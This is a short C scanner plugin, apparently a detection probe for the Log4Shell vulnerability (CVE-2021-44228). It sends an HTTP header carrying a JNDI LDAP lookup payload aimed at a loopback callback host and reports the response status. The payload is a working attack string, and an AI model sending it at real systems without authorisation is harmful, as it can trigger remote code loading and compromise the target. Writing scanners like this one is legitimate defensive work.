/* http-vuln-cve2021-44228-4 - Log4Shell JNDI injection probe. */
#include "arsenal_util.h"

int almap_script_run(AlScriptContext *ctx) {
    char resp[8192];
    int n;

    if (!ar_valid(ctx)) {
        return 1;
    }
    n = ar_http_request(ctx, "GET", "/", NULL, "X-Api-Version: ${jndi:ldap://127.0.0.1/a}\r\n", NULL, NULL,
                        resp, sizeof(resp));
    if (n <= 0) {
        ar_out(ctx, "http-vuln-cve2021-44228-4: no HTTP response");
        return 0;
    }
    ar_out(ctx, "probe sent: / [%d] (CVE-2021-44228; verify out-of-band)",
           ar_http_status(resp));
    return 0;
}
